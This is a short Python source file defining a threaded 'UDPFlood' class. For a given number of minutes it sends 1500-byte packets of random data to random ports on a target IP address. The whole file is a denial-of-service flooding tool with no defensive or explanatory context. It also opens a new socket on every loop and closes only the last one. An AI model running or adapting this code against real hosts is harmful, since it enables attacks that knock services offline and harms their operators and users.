import threading
import sys
import random
import socket
import os
from datetime import datetime, timedelta
import time


class UDPFlood(threading.Thread):
    def __init__(self, ip, duration):
        threading.Thread.__init__(self)
        self.ip = ip
        self.duration = duration

    def run(self):
        self.nameofthread = threading.Thread.getName(self)
        # print(threading.Thread.getName(self))
        self.sent_packets = 0
        port = random.randint(1024, 65535)
        star_time = datetime.now()
        end_time = star_time + timedelta(minutes=self.duration)
        # for testing reasons just 20 seconds
        #end_time = star_time + timedelta(seconds=20)
        while datetime.now() <= end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((self.ip, random.randint(1024, 65535)))
            s.send(os.urandom(1500))
            time.sleep(0.1)
            self.sent_packets = self.sent_packets + 1
        # print(threading.Thread.getName(self) +
        #      " sent " + str(sent_packets) + " packets")
        s.close()
        return self.sent_packets